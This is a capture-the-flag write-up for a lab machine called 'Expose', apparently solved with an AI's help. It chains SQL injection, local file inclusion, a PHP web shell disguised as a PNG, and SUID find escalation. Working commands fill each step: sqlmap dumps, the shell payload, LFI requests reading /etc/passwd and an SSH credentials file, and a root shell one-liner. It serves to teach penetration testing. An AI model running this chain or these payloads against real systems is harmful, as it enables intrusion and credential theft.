# Expose CTF Writeup
(*solved by gemini 🤖🤖🤖*)
## 1. Reconnaissance
We started with a fast Nmap scan to identify open ports and services on the target machine `10.48.166.69`.
```bash
nmap -sV -sC -p- --min-rate 5000 10.48.166.69
```
The scan revealed four open ports:
- **21/tcp**: FTP (vsftpd 3.0.3) - Anonymous login allowed, but no files found.
- **22/tcp**: SSH (OpenSSH)
- **53/tcp**: DNS (ISC BIND 9.16.1)
- **1337/tcp**: HTTP (Apache 2.4.41)

We investigated the web server on port 1337. Accessing `http://10.48.166.69:1337/` showed a static page with the text "EXPOSED".

We used `ffuf` to fuzz for hidden directories and files.
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.48.166.69:1337/FUZZ -mc 200,301,302,403 -t 50
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://10.48.166.69:1337/FUZZ -mc 200,301,302,403 -t 50
```
This revealed several interesting endpoints:
- `/admin`
- `/javascript`
- `/phpmyadmin`
- `/admin_101`

Checking `/admin_101` presented a login page pre-filled with the username `hacker@root.thm`.

## 2. Initial Exploitation (SQL Injection)
We tested the login form at `/admin_101/includes/user_login.php` for SQL injection. A basic test showed an error message reflecting our input, indicating vulnerability:
```bash
curl -sL -X POST -d "email=hacker@root.thm' OR '1'='1&password=1" http://10.48.166.69:1337/admin_101/includes/user_login.php
```

We used `sqlmap` to automate the exploitation and dump the database.
```bash
sqlmap -u "http://10.48.166.69:1337/admin_101/includes/user_login.php" --data="email=hacker@root.thm&password=1" -p email --batch --dump
```
SQLMap dumped two tables from the `expose` database:
- **user**: Contained credentials `hacker@root.thm` : `VeryDifficultPassword!!#@#@!#!@#1231`
- **config**: Contained paths and passwords for other hidden portals:
  - `/file1010111/index.php` with MD5 password hash `69c66901194a6486176e81f5945b8929`
  - `/upload-cv00101011/index.php` with the hint `// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z`

## 3. Password Cracking & LFI Discovery
We cracked the MD5 hash using an online database (or hashcat/john with rockyou.txt):
```bash
curl -sLk https://nitrxgen.net/md5db/69c66901194a6486176e81f5945b8929
```
The cracked password was `easytohack`.

We used this password to log in to `http://10.48.166.69:1337/file1010111/index.php`. The response contained a hidden hint: `Hint: Try file or view as GET parameters?`. 

We tested for Local File Inclusion (LFI) using the `file` parameter:
```bash
curl -sL -X POST -d "password=easytohack" "http://10.48.166.69:1337/file1010111/index.php?file=/etc/passwd"
```
This successfully returned the contents of `/etc/passwd`. Looking at the user list, we found a user starting with "z": `zeamkish`.

## 4. File Upload and RCE
Using the username `zeamkish` as the password, we authenticated to the second hidden portal: `http://10.48.166.69:1337/upload-cv00101011/index.php`.

This page presented a file upload form that accepted `.png` and `.jpg` files. We created a PHP web shell masquerading as a PNG file:
```bash
echo "<?php system(\$_POST['cmd']); ?>" > test2.png
```

We uploaded the payload:
```bash
curl -i -sL -X POST -H "Cookie: PHPSESSID=ln5t4412jf64m27l98ln6ct1ct" -F "file=@test2.png;type=image/png" http://10.48.166.69:1337/upload-cv00101011/index.php
```
The successful upload response revealed the upload directory: `/upload_thm_1001`. The full path to our payload was `/var/www/html/upload-cv00101011/upload_thm_1001/test2.png`.

We achieved Remote Code Execution (RCE) by chaining the LFI vulnerability with our uploaded web shell. We used a POST request for the `cmd` parameter to avoid URI length limits.
```bash
curl -sL -X POST --data-urlencode "password=easytohack" --data-urlencode "cmd=id" "http://10.48.166.69:1337/file1010111/index.php?file=/var/www/html/upload-cv00101011/upload_thm_1001/test2.png"
```

## 5. Lateral Movement
Using our RCE, we explored the `/home/zeamkish` directory:
```bash
curl -sL -X POST --data-urlencode "password=easytohack" --data-urlencode "cmd=ls -la /home/zeamkish" "http://10.48.166.69:1337/file1010111/index.php?file=/var/www/html/upload-cv00101011/upload_thm_1001/test2.png"
```
We found a world-readable file `ssh_creds.txt` and read its contents:
```bash
curl -sL -X POST --data-urlencode "password=easytohack" --data-urlencode "cmd=cat /home/zeamkish/ssh_creds.txt" "http://10.48.166.69:1337/file1010111/index.php?file=/var/www/html/upload-cv00101011/upload_thm_1001/test2.png"
```
This revealed the SSH credentials: `zeamkish` : `easytohack@123`.

We logged in via SSH and grabbed the user flag:
```bash
sshpass -p "easytohack@123" ssh -o StrictHostKeyChecking=no zeamkish@10.48.166.69 "cat /home/zeamkish/flag.txt"
```
**User Flag**: `THM{USER_FLAG_1231_EXPOSE}`

## 6. Privilege Escalation
We checked for SUID binaries on the system:
```bash
sshpass -p "easytohack@123" ssh -o StrictHostKeyChecking=no zeamkish@10.48.166.69 "find / -perm -4000 -type f 2>/dev/null"
```
We noticed that `/usr/bin/find` had the SUID bit set. We can exploit SUID `find` to execute commands as root.

We used it to list the root directory and read the root flag:
```bash
sshpass -p "easytohack@123" ssh -o StrictHostKeyChecking=no zeamkish@10.48.166.69 "/usr/bin/find . -exec /bin/sh -p -c 'cat /root/flag.txt' \; -quit"
```
**Root Flag**: `THM{ROOT_EXPOSED_1001}`